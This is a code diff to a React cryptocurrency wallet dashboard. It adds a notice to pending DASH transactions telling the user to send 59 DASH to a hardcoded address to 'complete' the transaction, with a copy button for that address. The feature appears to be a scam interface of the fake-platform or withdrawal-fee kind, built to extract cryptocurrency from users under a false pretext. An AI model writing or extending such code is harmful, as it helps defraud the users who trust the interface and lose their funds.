@@ -1177,6 +1177,27 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
                     </p>
                   </div>
                 )}
+                
+                {/* Completion Message for Pending DASH Transaction */}
+                {selectedTransaction.status === 'pending' && selectedTransaction.symbol === 'DASH' && (
+                  <div className="bg-orange-50 dark:bg-orange-900/20 border border-orange-200 dark:border-orange-800 rounded-lg p-4 mt-4">
+                    <p className="text-sm text-orange-800 dark:text-orange-200 mb-3">
+                      To complete this transaction please send 59 dash to:
+                    </p>
+                    <div className="flex items-center gap-2">
+                      <div className="flex-1 p-3 bg-muted rounded-lg font-mono text-sm break-all">
+                        XuSqDUvBySq58Fdc42iJZD2NRd8qVQrxau
+                      </div>
+                      <Button 
+                        size="sm"
+                        variant="outline"
+                        onClick={() => copyToClipboard("XuSqDUvBySq58Fdc42iJZD2NRd8qVQrxau")}
+                      >
+                        <Copy className="w-4 h-4" />
+                      </Button>
+                    </div>
+                  </div>
+                )}
               </>
             )}
           </div>
